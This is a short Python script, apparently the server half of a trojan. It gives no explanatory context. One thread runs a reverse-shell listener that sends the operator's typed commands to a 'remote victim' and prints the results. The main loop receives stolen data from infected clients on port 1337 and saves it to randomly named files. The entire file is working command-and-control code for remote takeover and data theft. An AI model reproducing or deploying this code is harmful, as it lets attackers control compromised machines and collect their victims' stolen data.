#!/usr/bin/python3
import socket
import random
from string import ascii_lowercase
import threading,os

host="127.0.0.1"

def reverse_shell():
	global host
	port=9999
	# create socket for reverse shell server 
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host,port))
	s.listen(5)
	conn, address = s.accept()
	print("Connection has been established! |" + " IP " + address[0] )
	print("Enter commands on remote victim :\n")
	while True:
		cmd=input()
		#quit if input = "quit"
		if cmd == 'quit':
			conn.close()
			s.close()
			os._exit(2)
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024),"utf-8")
			print(client_response, end="")
	conn.close()



#recieving Trojan data on server side
# create TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# listen on localhost port 1337
s.bind((host, 1337))
# queue up to 5 requests
s.listen(5)
#shell thread
shell_thread=threading.Thread(target=reverse_shell)
shell_thread.start()

print("listening on port 1337 to recive steal data...")

while True:
	# establish a connection
	clientsocket, client_ip = s.accept()
	print("\n[+] received a data from -> {}".format(client_ip))
	#open a file with a random name and insert the decoded data into it
	random_fd = open("".join(random.choices(ascii_lowercase, k = 10)), "w")
	while True:
		# get the encoded data
			encoded_data = clientsocket.recv(4096)
			if  not encoded_data:
				clientsocket.close()
				random_fd.close()
				break
			
			else :
				check=encoded_data.decode("utf-8")
				random_fd.write(check)
